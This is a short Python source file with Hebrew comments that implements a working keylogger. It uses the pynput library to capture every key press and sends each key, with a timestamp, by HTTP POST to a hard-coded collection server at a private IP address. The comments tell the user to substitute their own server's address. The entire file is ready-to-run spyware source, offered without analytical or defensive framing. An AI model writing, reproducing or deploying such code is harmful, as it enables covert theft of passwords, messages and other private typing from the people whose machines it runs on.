from pynput.keyboard import Listener
import requests
from datetime import datetime
import time


class KeyLogger:
    def __init__(self):
        self.data = ""
        self.send = SendData()
        self.TIME=10


    def save_data(self, key):
        key_str = str(key).replace("'", "")
        self.data += key_str
        now = datetime.now()

        self.send.send_to_server({"key": key_str,"time":now.strftime("%Y-%m-%d %H:%M")})


    def start_logging(self):
        with Listener(on_press=self.save_data) as listener:
            listener.join()

class SendData:
    def __init__(self):
        self.url = f"http://192.168.150.142:5000/submit"  # שימוש בכתובת ה-IP של השרת

    def send_to_server(self, data):
        try:
            response = requests.post(self.url, json=data, timeout=5)
            if response.status_code == 200:
                print("Sent successfully!")
            else:
                print(f"Error: {response.status_code}, {response.text}")
        except Exception as e:
            print(f"Error: {e}")

# הכנסת כתובת ה-IP של השרת
# עדכן לכתובת ה-IP של השרת שלך
k = KeyLogger()
k.start_logging()
